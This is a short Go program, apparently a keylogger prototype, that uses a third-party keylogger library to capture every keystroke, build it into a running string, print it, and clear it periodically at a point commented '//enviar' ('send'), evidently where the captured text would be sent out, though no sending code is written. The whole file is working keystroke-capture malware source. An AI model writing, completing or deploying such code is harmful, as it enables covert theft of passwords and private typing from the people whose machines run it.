package main

import (
	"fmt"
	"time"

	"github.com/kindlyfire/go-keylogger"
)


func main() {
	kl := keylogger.NewKeylogger()
	milisegundos := 0
	texto := ""

	for {
		key := kl.GetKey()
		if !key.Empty {
			texto = texto + string(key.Rune)
			fmt.Println(texto)
		}
		milisegundos++
		if(milisegundos==10000){
			milisegundos = 0
			texto = ""
			//enviar
		}
		time.Sleep(5 * time.Millisecond)
	}
}
